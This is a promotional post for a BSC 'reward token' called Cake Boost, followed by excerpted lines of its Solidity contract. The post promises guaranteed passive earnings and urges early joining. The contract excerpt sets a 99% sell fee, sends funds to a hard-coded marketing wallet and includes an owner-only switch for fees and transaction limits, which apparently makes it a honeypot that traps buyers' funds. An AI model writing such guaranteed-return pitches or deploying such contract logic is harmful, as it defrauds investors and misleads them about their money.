...
Welcome to the official Cake Boost community!

What is Cake Boost?
Cake Boost is a high reward token created to guarantee automatic passive earnings to  the community. Hold Cake Boost and enjoy your Cake rewards every 30 minutes!

About us
We’re a solid team already involved in previous successful projects. We want the community to be an active part of our family knowing that we as a team will be 100% devoted to the project. 

Our marketing plan
In order to deliver the best community reward token in BSC, our marketing manager has planned the most accurate schedule to ensure an organic growth of our community. Join our Telegram group and watch the results of our campaign.

Giveaways to the community
Cake Boost’s community will be strong and active: get ready for giveaways, random rewards to the most active members, community games, merch and much more!
Our whitelist competition will start in the next days, stay tuned and take advantage of being an early member.

Our website is ready and our dashboard is under development (a dashboard is a website page where you’ll be able to claim your rewards manually), it will be live before launch, wait for our official announcement!

We thank everyone who will be part of Cake Boost. 
Join us, do your best for the community and get ready to be boosted!
...
contract CakeBoost is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0x23516e21EfD8d18decD0808A056Eb86e80a47C22); // Marketing Address
    ...
    string private _name = "CakeBoostToken";
    string private _symbol = "$CakeBoost";
    ...
    uint256 private _sellLiquidityFee = 99;
    ...
    uint256 private minimumTokensBeforeSwap = 0 * 10**6 * 10**9; 
    ...
    function prepareForPreSale() external onlyOwner {
        ...
        _taxFee = 0;
        _liquidityFee = 0;
        _maxTxAmount = 1000000000 * 10**6 * 10**18;
    }
